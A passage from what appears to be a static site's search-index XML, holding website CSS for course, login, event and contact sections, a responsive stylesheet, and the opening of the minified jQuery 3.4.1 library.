25px;  font-weight: bold;  color: #da54179d;  font-size: 24px;}.course_section .course_container .course_content .box::before {  content: "";  position: absolute;  width: 100%;  height: 100%;  background-color: #133e3f;  opacity: 0.9;  display: none;}.course_section .course_container .course_content .box:hover a {  display: -webkit-box;  display: -ms-flexbox;  display: flex;}.course_section .course_container .course_content .box:hover::before {  display: block;}.course_section .btn-box {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-pack: center;      -ms-flex-pack: center;          justify-content: center;}.course_section .btn-box a {  display: inline-block;  padding: 8px 45px;  background-color: #133e3f;  border: 1px solid #133e3f;  color: #ffffff;  margin-top: 45px;}.course_section .btn-box a:hover {  background-color: transparent;  color: #133e3f;}.login_section {  background-image: url(../images/login-bg.jpg);  background-size: cover;  color: #ffffff;}.login_section .row {  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;}.login_section .detail-box h3 {  text-transform: uppercase;  font-weight: bold;}.login_section .detail-box a {  display: inline-block;  padding: 7px 25px;  background-color: #4bc5b8;  border: 1px solid #4bc5b8;  color: #ffffff;  margin-top: 15px;  font-weight: 600;}.login_section .detail-box a:hover {  background-color: transparent;  color: #4bc5b8;}.login_section .login_form {  padding: 30px 15px;  background-color: rgba(255, 255, 255, 0.25);  text-align: center;  border-radius: 15px;}.login_section .login_form h5 {  margin-bottom: 15px;}.login_section .login_form form input {  height: 40px;  width: 100%;  padding-left: 15px;  border: none;  outline: none;  border-radius: 5px;  margin: 10px 0;}.login_section .login_form form button {  display: inline-block;  padding: 7px 45px;  background-color: #252525;  border: 1px solid #252525;  color: #ffffff;  margin-top: 25px;  font-size: 15px;  text-transform: uppercase;  font-weight: bold;}.login_section .login_form form button:hover {  background-color: transparent;  color: #252525;}.event_section .heading_container h3 {  margin-bottom: 0;}.event_section .heading_container h3::before {  left: -2px;}.event_section p {  color: #a4a4a4;}.event_section .event_container .box {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;  border: 1px solid #cbcbcb;  margin: 15px 0;  border-radius: 5px;}.event_section .event_container .box > div {  -webkit-box-flex: 1;      -ms-flex: 1;          flex: 1;  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-orient: vertical;  -webkit-box-direction: normal;      -ms-flex-direction: column;          flex-direction: column;  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;  -webkit-box-pack: center;      -ms-flex-pack: center;          justify-content: center;  margin: 10px;}.event_section .event_container .box .img-box img {  width: 100%;}.event_section .event_container .box .detail-box {  border-left: 1px solid #b0b0b0;  border-right: 1px solid #b0b0b0;  -webkit-box-flex: 1.4;      -ms-flex: 1.4;          flex: 1.4;  padding: 10px 0;}.event_section .event_container .box .detail-box h4 {  font-weight: bold;}.event_section .event_container .box .detail-box h6 {  color: #a4a4a4;}.event_section .event_container .box .date-box h3 {  color: #0b5356;}.event_section .event_container .box .date-box h3 span {  font-size: 1.2em;  font-weight: bold;}.event_section .btn-box {  display: -webkit-box;  display: -ms-flexbox;  display: flex;}.event_section .btn-box a {  display: inline-block;  padding: 8px 45px;  background-color: #133e3f;  border: 1px solid #133e3f;  color: #ffffff;  margin-top: 35px;}.event_section .btn-box a:hover {  background-color: transparent;  color: #133e3f;}.client_section .heading_container {  margin-bottom: 45px;}.client_section .heading_container h3 {  margin-bottom: 5px;}.client_section .heading_container h3::before {  left: -2px;}.client_section .box {  display: -webkit-box;  display: -ms-flexbox;  display: flex;}.client_section .box .img-box {  min-width: 105px;  margin-right: 25px;}.client_section .box .img-box img {  width: 100%;}.client_section .box .detail-box h5 {  font-weight: bold;  text-transform: uppercase;}.client_section #carouselExampleControls {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-pack: justify;      -ms-flex-pack: justify;          justify-content: space-between;}.client_section #carouselExampleControls .carousel-inner {  -ms-flex-preferred-size: 80%;      flex-basis: 80%;}.client_section #carouselExampleControls .btn-box {  -ms-flex-preferred-size: 10%;      flex-basis: 10%;  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-orient: vertical;  -webkit-box-direction: reverse;      -ms-flex-direction: column-reverse;          flex-direction: column-reverse;  -webkit-box-pack: end;      -ms-flex-pack: end;          justify-content: flex-end;}.client_section #carouselExampleControls .btn-box .carousel-control-prev,.client_section #carouselExampleControls .btn-box .carousel-control-next {  position: relative;  width: 45px;  height: 45px;  background-color: #4bc5b8;  opacity: 1;  background-size: 18px;  background-position: center;  background-repeat: no-repeat;}.client_section #carouselExampleControls .btn-box .carousel-control-prev:hover,.client_section #carouselExampleControls .btn-box .carousel-control-next:hover {  background-color: #252525;}.client_section #carouselExampleControls .btn-box .carousel-control-prev {  background-image: url(../images/prev.png);}.client_section #carouselExampleControls .btn-box .carousel-control-next {  background-image: url(../images/next.png);  margin-bottom: 15px;}/* contact section */.contact_section {  background-color: #164745;  position: relative;  margin-bottom: 25px;}.contact_section .heading_container h3::before {  left: -1px;}.contact_section::before {  content: "";  position: absolute;  left: 0;  top: -1px;  height: 100.5%;  width: 40%;  background-color: #ffffff;  -webkit-clip-path: polygon(0 0, 95% 0, 65% 100%, 0% 100%);          clip-path: polygon(0 0, 95% 0, 65% 100%, 0% 100%);}.contact_section .row {  -webkit-box-align: center;      -ms-flex-align: center;          align-items: center;}.contact_section .detail-box {  width: 250px;}.contact_section .detail-box p {  margin-top: 5px;}.contact_section .contact-form {  padding: 45px 0;  border-radius: 20px;}.contact_section .contact-form h5 {  color: #ffffff;  font-weight: 600;  text-align: center;}.contact_section .contact-form input {  border: none;  outline: none;  background-color: #ffffff;  width: 100%;  margin: 15px 0;  padding: 10px 20px;  border-radius: 30px;}.contact_section .contact-form input.input_message {  height: 105px;  border-radius: 10px;}.contact_section .contact-form input::-webkit-input-placeholder {  color: #151515;}.contact_section .contact-form input:-ms-input-placeholder {  color: #151515;}.contact_section .contact-form input::-ms-input-placeholder {  color: #151515;}.contact_section .contact-form input::placeholder {  color: #151515;}.contact_section .contact-form button {  border: none;  outline: none;  padding: 12px 50px;  text-transform: uppercase;  margin-top: 25px;  background-color: #4bc5b8;  color: #fff;  border-radius: 30px;}.contact_section .map_img-box {  width: 80%;  margin: 25px auto 0 auto;}.contact_section .map_img-box img {  width: 100%;}/* end contact section */.info_section {  background-color: #2391bd9f;  color: #ffffff;}.info_section h5 {  text-transform: uppercase;  font-weight: 600;}.info_section .info_menu .navbar-nav .nav-item .nav-link {  color: #ffffff;}.info_section .info_news .info_contact {  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-orient: vertical;  -webkit-box-direction: normal;      -ms-flex-direction: column;          flex-direction: column;  -webkit-box-align: start;      -ms-flex-align: start;          align-items: flex-start;}.info_section .info_news .info_contact a {  color: #ffffff;  margin-bottom: 5px;}.info_section .info_news form {  margin-top: 15px;}.info_section .info_news form input {  width: 100%;  border: none;  outline: none;  padding: 8px 10px;  background-color: #e0e0e0;}.info_section .info_news form input::-webkit-input-placeholder {  color: #acaeae;}.info_section .info_news form input:-ms-input-placeholder {  color: #acaeae;}.info_section .info_news form input::-ms-input-placeholder {  color: #acaeae;}.info_section .info_news form input::placeholder {  color: #acaeae;}.info_section .info_news form button {  display: inline-block;  padding: 7px 45px;  background-color: #4bc5b8;  border: 1px solid #4bc5b8;  color: #ffffff;  margin-top: 15px;}.info_section .info_news form button:hover {  background-color: transparent;  color: #4bc5b8;}/* footer section*/.footer_section {  background-color: #7acddbd8;  font-weight: 500;  display: -webkit-box;  display: -ms-flexbox;  display: flex;  -webkit-box-pack: center;      -ms-flex-pack: center;          justify-content: center;}.footer_section p {  padding: 20px 65px;  color: #ffffff;  margin: 0 auto;  text-align: center;  border-top: 1px solid rgba(224, 224, 224, 0.808);}.footer_section a {  color: #ffffff;}/* end footer section*//*# sourceMappingURL=style.css.map */]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/css/responsive.css"/>
      <url>/sources/css/responsive.css</url>
      
        <content type="html"><![CDATA[@media (max-width: 1120px) {}@media (max-width: 992px) {    .hero_area {        height: auto;    }    header.header_section {        padding-top: 10px;    }    .navbar-nav {        align-items: center;        padding-top: 10px;    }    .custom_nav-container .navbar-toggler {        margin-right: -15px;    }    .custom_nav-container .navbar-nav .nav-item .nav-link {        padding: 15px;        margin: 5px 0;    }    .custom_nav-container .form-inline {        padding: 0;        justify-content: center;    }    .custom_nav-container .nav_search-btn {        background-position: center;    }    .slider_section .detail-box {        margin-top: 75px;    }    .slider_section .detail-box h1 {        letter-spacing: 0.5rem;    }    .slider_section .carousel-indicators {        bottom: 25px;    }    .special_section .special_container {        flex-direction: column;    }    .special_section .special_container .box {        padding: 15px 0;    }    .special_section .special_container .box.b2 {        border: none;        border-top: 1px solid #4e6e6f;        border-bottom: 1px solid #4e6e6f;    }    .course_section .side_img {        width: 25px;    }    .event_section .event_container {        display: flex;        justify-content: space-between;        text-align: center;    }    .event_section .event_container .box {        flex-direction: column;        margin: 15px 5px;    }    .event_section .event_container .box .detail-box {        padding: 15px;        border: none;        border-top: 1px solid #b0b0b0;        border-bottom: 1px solid #b0b0b0;    }    .event_section .btn-box {        justify-content: center;    }    .contact_section::before {        width: 53%;    }}@media (max-width: 768px) {    .slider_section .detail-box h1 {        font-size: 3.5rem;        letter-spacing: .1rem;    }    .info_section .info_form .social_box {        justify-content: center;    }    .info_section .info_form .social_box a {        margin: 0 10px;    }    .footer_section p {        padding: 20px 30px;    }    .about_section .side_img {        width: 25px;    }    .course_section .course_container .course_content .box {        -ms-flex-preferred-size: 45%;        flex-basis: 46%;        margin: 2%;    }    .course_section .course_container .course_content .box h5 {        font-size: 20px;        left: 15px;        bottom: 5px;    }    .course_section .course_container .course_content .box a {        left: 15px;        bottom: 75px;    }    .login_section .detail-box {        margin-bottom: 45px;    }    .client_section #carouselExampleControls {        flex-direction: column;        align-items: center;    }    .client_section #carouselExampleControls .btn-box {        flex-direction: row;        width: 100px;        justify-content: space-between;        margin-top: 25px;    }    .contact_section .detail-box {        text-align: center;        width: auto;        margin: 45px;    }    .contact_section .detail-box .heading_container {        align-items: center;    }    .contact_section::before {        width: 100%;        height: 25%;        clip-path: polygon(0% 5%, 100% 5%, 85% 100%, 15% 100%);    }    .info_section .row>div {        display: flex;        flex-direction: column;        align-items: center;        text-align: center;    }    .info_section .info_course {        margin: 35px 0;    }    .info_section .info_news .info_contact {        align-items: center;    }}@media (max-width: 576px) {    .slider_section .detail-box h1 {        font-size: 3rem;        letter-spacing: .1rem;    }    .course_section .course_container .course_content .box {        flex-basis: 92%;    }    .course_section .side_img {        width: 20px;    }    .event_section .event_container {        display: flex;        justify-content: space-between;    }    .event_section .event_container {        flex-direction: column;        align-items: center;    }    .client_section .box {        flex-direction: column;        align-items: center;    }    .contact_section::before {        clip-path: polygon(0% 2%, 100% 2%, 85% 100%, 15% 100%);    }}@media (max-width: 480px) {    .special_section .special_container .box .detail-box h4 {        font-size: 1.2rem;    }    .slider_section .detail-box h1 {        font-size: 2.5rem;        letter-spacing: 1px;    }    .slider_section .detail-box a {        padding: 8px 35px;    }    .about_section .side_img {        width: 20px;    }    .about_section .detail-box {        margin-top: 35px;    }}@media (max-width: 400px) {    .slider_section .detail-box h1 {        font-size: 2rem;        letter-spacing: 1px;    }}@media (max-width: 360px) {    .slider_section .detail-box h1 {        font-size: 1.9rem;        letter-spacing: 1px;    }    .contact_section::before {        height: 26%;    }}@media (min-width: 1200px) {    .container {        max-width: 1170px;    }}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/js/jquery-3.4.1.min.js"/>
      <url>/sources/js/jquery-3.4.1.min.js</url>
      
        <content type="html"><![CDATA[/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */!function (e, t) { "use strict"; "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function (e) { if (!e.document) throw new Error("jQuery requires a window with a document"); return t(e) } : t(e) }("undefined" != typeof window ? window : this, function (C, e) { "use strict"; var t = [], E = C.document, r = Object.getPrototypeOf, s = t.slice, g = t.concat, u = t.push, i = t.indexOf, n = {}, o = n.toString, v = n.hasOwnProperty, a = v.toString, l = a.call(Object), y = {}, m = function (e) { return "function" == typeof e && "number" != typeof e.nodeType }, x = function (e) { return null != e && e === e.window }, c = { type: !0, src: !0, nonce: !0, noModule: !0 }; function b(e, t, n) { var r, i, o = (n = n || E).createElement("script"); if (o.text = e, t) for (r in c) (i = t[r] || t.getAttribute && t.getAttribute(r)) && o.setAttribute(r, i); n.head.appendChild(o).parentNode.removeChild(o) } function w(e) { return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? n[o.call(e)] || "object" : typeof e } var f = "3.4.1", k = function (e, t) { return new k.fn.init(e, t) }, p = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g; function d(e) { var t = !!e && "length" in e && e.length, n = w(e); return !m(e) && !x(e) && ("array" === n || 0 === t || "number" == typeof t && 0 < t && t - 1 in e) } k.fn = k.prototype = { jquery: f, constructor: k, length: 0, toArray: function () { return s.call(this) }, get: function (e) { return null == e ? s.call(this) : e < 0 ? this[e + this.length] : this[e] }, pushStack: function (e) { var t = k.merge(this.constructor(), e); return t.prevObject = this, t }, each: function (e) { return k.each(this, e) }, map: function (n) { return this.pushStack(k.map(this, function (e, t) { return n.call(e, t, e) })) }, slice: function () { return this.pushStack(s.apply(this, arguments)) }, first: function () { return this.eq(0) }, last: function () { return this.eq(-1) }, eq: function (e) { var t = this.length, n = +e + (e < 0 ? t : 0); return this.pushStack(0 <= n && n < t ? [this[n]] : []) }, end: function () { return this.prevObject || this.constructor() }, push: u, sort: t.sort, splice: t.splice }, k.extend = k.fn.extend = function () { var e, t, n, r, i, o, a = arguments[0] || {}, s = 1, u = arguments.length, l = !1; for ("boolean" == typeof a && (l = a, a = arguments[s] || {}, s++), "object" == typeof a || m(a) || (a = {}), s === u && (a = this, s--); s < u; s++)if (null != (e = arguments[s])) for (t in e) r = e[t], "__proto__" !== t && a !== r && (l && r && (k.isPlainObject(r) || (i = Array.isArray(r))) ? (n = a[t], o = i && !Array.isArray(n) ? [] : i || k.isPlainObject(n) ? n : {}, i = !1, a[t] = k.extend(l, o, r)) : void 0 !== r && (a[t] = r)); return a }, k.extend({ expando: "jQuery" + (f + Math.random()).replace(/\D/g, ""), isReady: !0, error: function (e) { throw new Error(e) }, noop: function () { }, isPlainObject: function (e) { var t, n; return !(!e || "[object Object]" !== o.call(e)) && (!(t = r(e)) || "function" == typeof (n = v.call(t, "constructor") && t.constructor) && a.call(n) === l) }, isEmptyObject: function (e) { var t; for (t in e) return !1; return !0 }, globalEval: function (e, t) { b(e, { nonce: t && t.nonce }) }, each: function (e, t) { var n, r = 0; if (d(e)) { for (n = e.length; r < n; r++)if (!1 === t.call(e[r], r, e[r])) break } else for (r in e) if (!1 === t.call(e[r], r, e[r])) break; return e }, trim: function (e) { return null == e ? "" : (e + "").replace(p, "") }, makeArray: function (e, t) { var n = t || []; return null != e && (d(Object(e)) ? k.merge(n, "string" == typeof e ? [e] : e) : u.call(n, e)), n }, inArray: function (e, t, n) { return null == t ? -1 : i.call(t, e, n) }, merge: function (e, t) { for (var n = +t.length, r = 0, i = e.length; r < n; r++)e[i++] = t[r]; return e.length = i, e }, grep: function (e, t, n) { for (var r = [], i = 0, o = e.length, a = !n; i < o; i++)!t(e[i], i) !== a && r.push(e[i]); return r }, map: function (e, t, n) { var r, i, o = 0, a = []; if (d(e)) for (r = e.length; o < r; o++)null != (i = t(e[o], o, n)) && a.push(i); else for (o in e) null != (i = t(e[o], o, n)) && a.push(i); return g.apply([], a) }, guid: 1, support: y }), "function" == typeof Symbol && (k.fn[Symbol.iterator] = t[Symbol.iterator]), k.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) { n["[object " + t + "]"] = t.toLowerCase() }); var h = function (n) { var e, d, b, o, i, h, f, g, w, u, l, T, C, a, E, v, s, c, y, k = "sizzle" + 1 * new Date, m = n.document, S = 0, r = 0, p = ue(), x = ue(), N = ue(), A = ue(), D = function (e, t) { return e === t && (l = !0), 0 }, j = {}.hasOwnProperty, t = [], q = t.pop, L = t.push, H = t.push, O = t.slice, P = function (e, t) { for (var n = 0, r = e.length; n < r; n++)if (e[n] === t) return n; return -1 }, R = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped", M = "[\\x20\\t\\r\\n\\f]", I = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+", W = "\\[" + M + "*(" + I + ")(?:" + M + "*([*^$|!~]?=)" + M + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + I + "))|)" + M + "*\\]", $ = ":(" + I + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + W + ")*)|.*)\\)|)", F = new RegExp(M + "+", "g"), B = new RegExp("^" + M + "+|((?:^|[^\\\\])(?:\\\\.)*)" + M + "+$", "g"), _ = new RegExp("^" + M + "*," + M + "*"), z = new RegExp("^" + M + "*([>+~]|" + M + ")" + M + "*"), U = new RegExp(M + "|>"), X = new RegExp($), V = new RegExp("^" + I + "$"), G = { ID: new RegExp("^#(" + I + ")"), CLASS: new RegExp("^\\.(" + I + ")"), TAG: new RegExp("^(" + I + "|[*])"), ATTR: new RegExp("^" + W), PSEUDO: new RegExp("^" + $), CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + M + "*(even|odd|(([+-]|)(\\d*)n|)" + M + "*(?:([+-]|)" + M + "*(\\d+)|))" + M + "*\\)|)", "i"), bool: new RegExp("^(?:" + R + ")$", "i"), needsContext: new RegExp("^" + M + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + M + "*((?:-\\d)?\\d*)" + M + "*\\)|)(?=[^-]|$)", "i") }, Y = /HTML$/i, Q = /^(?:input|select|textarea|button)$/i, J = /^h\d$/i, K = /^[^{]+\{\s*\[native \w/, Z = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/, ee = /[+~]/, te = new RegExp("\\\\([\\da-f]{1,6}" + M + "?|(" + M + ")|.)", "ig"), ne = function (e, t, n) { var r = "0x" + t - 65536; return r != r || n ? t : r < 0 ? String.fromCharCode(r + 65536) : String.fromCharCode(r >> 10 | 55296, 1023 & r | 56320) }, re = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g, ie = function (e, t) { return t ? "\0" === e ? "\ufffd" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e }, oe = function () { T() }, ae = be(function (e) { return !0 === e.disabled && "fieldset" === e.nodeName.toLowerCase() }, { dir: "parentNode", next: "legend" }); try { H.apply(t = O.call(m.childNodes), m.childNodes), t[m.childNodes.length].nodeType } catch (e) { H = { apply: t.length ? function (e, t) { L.apply(e, O.call(t)) } : function (e, t) { var n = e.length, r = 0; while (e[n++] = t[r++]); e.length = n - 1 } } } function se(t, e, n, r) { var i, o, a, s, u, l, c, f = e && e.ownerDocument, p = e ? e.nodeType : 9; if (n = n || [], "string" != typeof t || !t || 1 !== p && 9 !== p && 11 !== p) return n; if (!r && ((e ? e.ownerDocument || e : m) !== C && T(e), e = e || C, E)) { if (11 !== p && (u = Z.exec(t))) if (i = u[1]) { if (9 === p) { if (!(a = e.getElementById(i))) return n; if (a.id === i) return n.push(a), n } else if (f && (a = f.getElementById(i)) && y(e, a) && a.id === i) return n.push(a), n } else { if (u[2]) return H.apply(n, e.getElementsByTagName(t)), n; if ((i = u[3]) && d.getElementsByClassName && e.getElementsByClassName) return H.apply(n, e.getElementsByClassName(i)), n } if (d.qsa && !A[t + " "] && (!v || !v.test(t)) && (1 !== p || "object" !== e.nodeName.toLowerCase())) { if (c = t, f = e, 1 === p && U.test(t)) { (s = e.getAttribute("id")) ? s = s.replace(re, ie) : e.setAttribute("id", s = k), o = (l = h(t)).length; while (o--) l[o] = "#" + s + " " + xe(l[o]); c = l.join(","), f = ee.test(t) && ye(e.parentNode) || e } try { return H.apply(n, f.querySelectorAll(c)), n } catch (e) { A(t, !0) } finally { s === k && e.removeAttribute("id") } } } return g(t.replace(B, "$1"), e, n, r) } function ue() { var r = []; return function e(t, n) { return r.push(t + " ") > b.cacheLength && delete e[r.shift()], e[t + " "] = n } } function le(e) { return e[k] = !0, e } function ce(e) { var t = C.createElement("fieldset"); try { return !!e(t) } catch (e) { return !1 } finally { t.parentNode && t.parentNode.removeChild(t), t = null } } function fe(e, t) { var n = e.split("|"), r = n.length; while (r--) b.attrHandle[n[r]] = t } function pe(e, t) { var n = t && e, r = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex; if (r) return r; if (n) while (n = n.nextSibling) if (n === t) return -1; return e ? 1 : -1 } function de(t) { return function (e) { return "input" === e.nodeName.toLowerCase() && e.type === t } } function he(n) { return function (e) { var t = e.nodeName.toLowerCase(); return ("input" === t || "button" === t) && e.type === n } } function ge(t) { return function (e) { return "form" in e ? e.parentNode && !1 === e.disabled ? "label" in e ? "label" in e.parentNode ? e.parentNode.disabled === t : e.disabled === t : e.isDisabled === t || e.isDisabled !== !t && ae(e) === t : e.disabled === t : "label" in e && e.disabled === t } } function ve(a) { return le(function (o) { return o = +o, le(function (e, t) { var n, r = a([], e.length, o), i = r.length; while (i--) e[n = r[i]] && (e[n] = !(t[n] = e[n])) }) }) } function ye(e) { return e && "undefined" != typeof e.getElementsByTagName && e } for (e in d = se.support = {}, i = se.isXML = function (e) { var t = e.namespaceURI, n = (e.ownerDocument || e).documentElement; return !Y.test(t || n && n.nodeName || "HTML") }, T = se.setDocument = function (e) { var t, n, r = e ? e.ownerDocument || e : m; return r !== C && 9 === r.nodeType && r.documentElement && (a = (C = r).documentElement, E = !i(C), m !== C && (n = C.defaultView) && n.top !== n && (n.addEventListener ? n.addEventListener("unload", oe, !1) : n.attachEvent && n.attachEvent("onunload", oe)), d.attributes = ce(function (e) { return e.className = "i", !e.getAttribute("className") }), d.getElementsByTagName = ce(function (e) { return e.appendChild(C.createComment("")), !e.getElementsByTagName("*").length }), d.getElementsByClassName = K.test(C.getElementsByClassName), d.getById = ce(function (e) { return a.appendChild(e).id = k, !C.getElementsByName || !C.getElementsByName(k).length }), d.getById ? (b.filter.ID = function (e) { var t = e.replace(te, ne); return function (e) { return e.getAttribute("id") === t } }, b.find.ID = function (e, t) { if ("undefined" != typeof t.getElementById && E) { var n = t.getElementById(e); return n ? [n] : [] } }) : (b.filter.ID = function (e) { var n = e.replace(te, ne); return function (e) { var t = "undefined" != typeof e.getAttributeNode && e.getAttributeNode("id"); return t && t.value === n } }, b.find.ID = function (e, t) { if ("undefined" != typeof t.getElementById && E) { var n, r, i, o = t.getElementById(e); if (o) { if ((n = o.getAttributeNode("id")) && n.value === e) return [o]; i = t.getElementsByName(e), r = 0; while (o = i[r++]) if ((n = o.getAttributeNode("id")) && n.value === e) return [o] } return [] } }), b.find.TAG = d.getElementsByTagName ? function (e, t) { return "undefined" != typeof t.getElementsByTagName ? t.getElementsByTagName(e) : d.qsa ? t.querySelectorAll(e) : void 0 } : function (e, t) { var n, r = [], i = 0, o = t.getElementsByTagName(e); if ("*" === e) { while (n = o[i++]) 1 === n.nodeType && r.push(n); return r } return o }, b.find.CLASS = d.getElementsByClassName && function (e, t) { if ("undefined" != typeof t.getElementsByClassName && E) return t.getElementsByClassName(e) }, s = [], v = [], (d.qsa = K.test(C.querySelectorAll)) && (ce(function (e) { a.appendChild(e).innerHTML = "<a id='" + k + "'></a><select id='" + k + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && v.push("[*^$]=" + M + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || v.push("\\[" + M + "*(?:value|" + R + ")"), e.querySelectorAll("[id~=" + k + "-]").length || v.push("~="), e.querySelectorAll(":checked").length || v.push(":checked"), e.querySelectorAll("a#" + k + "+*").length || v.push(".#.+[+~]") }), ce(function (e) { e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>"; var t = C.createElement("input"); t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && v.push("name" + M + "*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && v.push(":enabled", ":disabled"), a.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && v.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), v.push(",.*:") })), (d.matchesSelector = K.test(c = a.matches || a.webkitMatchesSelector || a.mozMatchesSelector || a.oMatchesSelector || a.msMatchesSelector)) && ce(function (e) { d.disconnectedMatch = c.call(e, "*"), c.call(e, "[s!='']:x"), s.push("!=", $) }), v = v.length && new RegExp(v.join("|")), s = s.length && new RegExp(s.join("|")), t = K.test(a.compareDocumentPosition), y = t || K.test(a.contains) ? function (e, t) { var n = 9 === e.nodeType ? e.documentElement : e, r = t && t.parentNode; return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r))) } : function (e, t) { if (t) while (t = t.parentNode) if (t === e) return !0; return !1 }, D = t ? function (e, t) { if (e === t) return l = !0, 0; var n = !e.compareDocumentPosition - !t.compareDocumentPosition; return n || (1 & (n = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !d.sortDetached && t.compareDocumentPosition(e) === n ? e === C || e.ownerDocument === m && y(m, e) ? -1 : t === C || t.ownerDocument === m && y(m, t) ? 1 : u ? P(u, e) - P(u, t) : 0 : 4 & n ? -1 : 1) } : function (e, t) { if (e === t) return l = !0, 0; var n, r = 0, i = e.parentNode, o = t.parentNode, a = [e], s = [t]; if (!i || !o) return e === C ? -1 : t === C ? 1 : i ? -1 : o ? 1 : u ? P(u, e) - P(u, t) : 0; if (i === o) return pe(e, t); n = e; while (n = n.parentNode) a.unshift(n); n = t; while (n = n.parentNode) s.unshift(n); while (a[r] === s[r]) r++; return r ? pe(a[r], s[r]) : a[r] === m ? -1 : s[r] === m ? 1 : 0 }), C }, se.matches = function (e, t) { return se(e, null, null, t) }, se.matchesSelector = function (e, t) { if ((e.ownerDocument || e) !== C && T(e), d.matchesSelector && E && !A[t + " "] && (!s || !s.test(t)) && (!v || !v.test(t))) try { var n = c.call(e, t); if (n || d.disconnectedMatch || e.document && 11 !== e.document.nodeType) return n } catch (e) { A(t, !0) } return 0 < se(t, C, null, [e]).length }, se.contains = function (e, t) { return (e.ownerDocument || e) !== C && T(e), y(e, t) }, se.attr = function (e, t) { (e.ownerDocument || e) !== C && T(e); var n = b.attrHandle[t.toLowerCase()], r = n && j.call(b.attrHandle, t.toLowerCase()) ? n(e, t, !E) : void 0; return void 0 !== r ? r : d.attributes || !E ? e.getAttribute(t) : (r = e.getAttributeNode(t)) && r.specified ? r.value : null }, se.escape = function (e) { return (e + "").replace(re, ie) }, se.error = function (e) { throw new Error("Syntax error, unrecognized expression: " + e) }, se.uniqueSort = function (e) { var t, n = [], r = 0, i = 0; if (l = !d.detectDuplicates, u = !d.sortStable && e.slice(0), e.sort(D), l) { while (t = e[i++]) t === e[i] && (r = n.push(i)); while (r--) e.splice(n[r], 1) } return u = null, e }, o = se.getText = function (e) { var t, n = "", r = 0, i = e.nodeType; if (i) { if (1 === i || 9 === i || 11 === i) { if ("string" == typeof e.textContent) return e.textContent; for (e = e.firstChild; e; e = e.nextSibling)n += o(e) } else if (3 === i || 4 === i) return e.nodeValue } else while (t = e[r++]) n += o(t); return n }, (b = se.selectors = { cacheLength: 50, createPseudo: le, match: G, attrHandle: {}, find: {}, relative: { ">": { dir: "parentNode", first: !0 }, " ": { dir: "parentNode" }, "+": { dir: "previousSibling", first: !0 }, "~": { dir: "previousSibling" } }, preFilter: { ATTR: function (e) { return e[1] = e[1].replace(te, ne), e[3] = (e[3] || e[4] || e[5] || "").replace(te, ne), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4) }, CHILD: function (e) { return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || se.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && se.error(e[0]), e }, PSEUDO: function (e) { var t, n = !e[6] && e[2]; return G.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && X.test(n) && (t = h(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3)) } }, filter: { TAG: function (e) { var t = e.replace(te, ne).toLowerCase(); return "*" === e ? function () { return !0 } : function (e) { return e.nodeName && e.nodeName.toLowerCase() === t } }, CLASS: function (e) { var t = p[e + " "]; return t || (t = new RegExp("(^|" + M + ")" + e + "(" + M + "|$)")) && p(e, function (e) { return t.test("string" == typeof e.className && e.className || "undefined" != typeof e.getAttribute && e.getAttribute("class") || "") }) }, ATTR: function (n, r, i) { return function (e) { var t = se.attr(e, n); return null == t ? "!=" === r : !r || (t += "", "=" === r ? t === i : "!=" === r ? t !== i : "^=" === r ? i && 0 === t.indexOf(i) : "*=" === r ? i && -1 < t.indexOf(i) : "$=" === r ? i && t.slice(-i.length) === i : "~=" === r ? -1 < (" " + t.replace(F, " ") + " ").indexOf(i) : "|=" === r && (t === i || t.slice(0, i.length + 1) === i + "-")) } }, CHILD: function 